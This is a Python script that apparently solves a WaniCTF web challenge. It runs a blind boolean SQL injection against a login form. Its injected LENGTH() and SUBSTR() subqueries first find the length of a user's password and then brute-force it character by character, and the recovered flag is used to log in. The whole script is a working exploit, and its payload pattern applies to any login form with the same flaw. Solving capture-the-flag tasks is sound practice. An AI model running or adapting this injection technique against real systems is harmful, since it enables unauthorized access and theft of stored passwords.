#!/usr/bin/python3

import requests

URL = 'https://watch.web.wanictf.org/'
EMAIL = "wanictf21spring@gmail.com"
RESPONSE = "Crocodiles or true crocodiles are large semiaquatic reptiles that live throughout the tropics in Africa, Asia, the Americas and Australia."

def Lcheck(p):
    print("----- result -----")
    payload = {
        "email": EMAIL,
        "password": p
    }
    print("- Email address: " + EMAIL)
    print("- Password: " + p)
    r = requests.post(URL, data=payload)
    if RESPONSE in r.text:
        print(" -> Login successful")
    else:
        print(" -> Login failure")

def PWlen():
    for i in range(1, 100):
        payload = {
            "email": EMAIL,
            "password": f"' OR (SELECT LENGTH(password) FROM users WHERE email = '{EMAIL}') = {i};"
        }
        r = requests.post(URL, data=payload)
        if RESPONSE in r.text:
            print(f"- length of the password is {i}")
            return i

def PWsearch():
    flag = "FLAG{"
    s = PWlen()
    for i in range(6, s+1):
        for j in range(0x20, 0x7F):
            payload = {
                "email": EMAIL,
                "password": f"' OR SUBSTR((SELECT password FROM users WHERE email = '{EMAIL}'),{i},1) = '{chr(j)}';"
            }
            r = requests.post(URL, data=payload)
            if RESPONSE in r.text:
                flag += chr(j)
                #print(flag)
    print("- flag is: " + flag)
    Lcheck(flag)

if __name__ == "__main__":
    PWsearch()
